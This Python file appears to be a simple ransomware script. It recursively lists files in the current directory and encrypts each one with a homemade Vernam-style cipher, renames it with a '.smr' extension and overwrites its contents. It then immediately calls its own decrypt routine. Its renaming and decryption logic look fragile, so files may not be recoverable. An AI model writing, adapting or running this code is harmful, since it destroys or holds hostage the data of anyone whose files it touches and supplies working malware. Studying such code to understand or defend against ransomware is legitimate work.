import os
import base64

def getListOfFiles(dirName):
    listOfFile = os.listdir(dirName)
    allFiles = list()
    for entry in listOfFile:
        fullPath = os.path.join(dirName, entry)
        if os.path.isdir(fullPath):
            allFiles = allFiles + getListOfFiles(fullPath)
        else:
            allFiles.append(fullPath)                
    return allFiles

def vernan(string, password, mode):
    if len(password) < len(string):
        while len(password) < len(string):
            password = base64.b64encode(password.encode("ascii")).decode("ascii")
    i = 0
    aux = ""
    aux2 = []
    strLen = len(string)

    while i < strLen:
        if mode == "b":
            passw = int(str(ord(password[i])))
            if int(string[i]) < passw:
                string[i] = int(string[i]) + 127
            aux2.append(chr((int(string[i])) - passw))

        else:
            try:
                aux += str(((int(str(ord(string[i]))) + int(str(ord(password[i]))))%127))
                aux += "+"
            except Exception as err:
                "nothing"

        i += 1
    if mode == "b":
        aux2 = "".join(aux2)
        return bytearray.fromhex(aux2)
    else:
        return aux[:-1]

def ransom(passw, ext, path):
    print("Starting to encrypt files...")
    files = getListOfFiles(path)
    thisFile = f"{path}{__file__}"
    i = 0;
    while i < len(files):
        if files[i] != thisFile:
            print(f"Encrypting file {files[i]}...")
            f = open(files[i], "r+b")
            fContent = f.read()
            fContent = fContent.hex()
            if os.path.splitext(files[i])[1]:
                if os.path.splitext(files[i])[1] != f".{ext}":
                    os.rename(f"{files[i][2:]}", f"{files[i][2:]}.{ext}")

            if not os.path.splitext(files[i])[1]:
                if not os.path.exists(f"{files[i][2:]}.{ext}"):
                    os.rename(f"{files[i][2:]}", f"{files[i][2:]}.{ext}")
            f.close()
            try:
                f = open(files[i], "r+")
            except Exception as err:
                f = open(f"{files[i]}.{ext}", "r+")
            f.seek(0)
            f.truncate()
            f.write("".join(vernan(fContent, passw, "f")))
            print(f"File \"{files[i]}\" encrypted.\n")
            f.close()
        i += 1

# I want to separate logic in functions to simplify understanding.
def dransom(passw, ext, path):
    print("Starting to decrypt files...")
    files = getListOfFiles(path)
    thisFile = f"{path}{__file__}"

    i = 0;
    while i < len(files):
        if files[i] != thisFile:
            print(f"Decrypting file {files[i]}...")
            f = open(files[i], "r+")
            fContent = f.read()
            fContent = fContent.split("+")
            if os.path.splitext(files[i])[1]:
                if os.path.splitext(files[i])[1] != f".{ext}":
                    os.rename(f"{files[i][2:]}", f"{files[i][2:]}.{ext}")

            if not os.path.splitext(files[i])[1]:
                if not os.path.exists(f"{files[i][2:]}.{ext}"):
                    os.rename(f"{files[i][2:]}", f"{files[i][2:]}.{ext}")
            f.close()
            try:
                f = open(files[i], "r+b")
            except Exception as err:
                f = open(f"{files[i]}.{ext}", "r+b")
            f.seek(0)
            f.truncate()
            f.write(vernan(fContent, passw, "b"))
            print(f"File \"{files[i]}\" decrypted.\n")
            f.close()
        i += 1

        
ransom("1337", "smr", "./")    
dransom("1337", "smr", "./") 
